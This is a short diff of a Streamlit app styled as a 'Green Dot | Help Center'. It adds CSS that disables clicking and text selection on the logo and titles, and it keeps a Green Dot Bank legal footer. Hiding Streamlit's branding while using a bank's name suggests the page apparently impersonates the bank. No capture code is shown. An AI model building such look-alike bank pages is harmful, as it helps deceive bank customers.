@@ -23,7 +23,7 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")
 
-# CSS REFORZADO: Bloqueo de enlaces en logo y títulos
+# CSS REFORZADO FINAL
 st.markdown("""<style>
 /* Fondo Negro */
 .stApp {
@@ -36,11 +36,12 @@ header, footer, #MainMenu, .stDeployButton {visibility: hidden !important; displ
 [data-testid='stHeader'], [data-testid='stAppToolbar'], [data-testid='stFooterAd'] {display: none !important;}
 
 /* ELIMINAR LINKS EN LOGO Y TÍTULOS */
-/* Desactiva clics en el contenedor de la imagen y los encabezados */
+/* Desactivar absolutamente toda interacción en el área superior */
 [data-testid="stImage"], [data-testid="stMarkdownContainer"] h1, [data-testid="stMarkdownContainer"] h2, .section-anchor {
     pointer-events: none !important;
     cursor: default !important;
     text-decoration: none !important;
+    user-select: none !important;
 }
 
 /* Ocultar específicamente el ancla invisible de Streamlit */
@@ -113,6 +114,6 @@ st.markdown("""<div class='app-promo-container'>
 </div>""", unsafe_allow_html=True)
 
 st.markdown("""<div class='legal-footer'>
-Green Dot cards are issued by Green Dot Bank, Member FDIC. 
+Green Dot cards are issued by Green Dot Bank, Member FDIC.
 ©2026 Green Dot Bank. All rights reserved. NMLS #914924.
 </div>""", unsafe_allow_html=True)
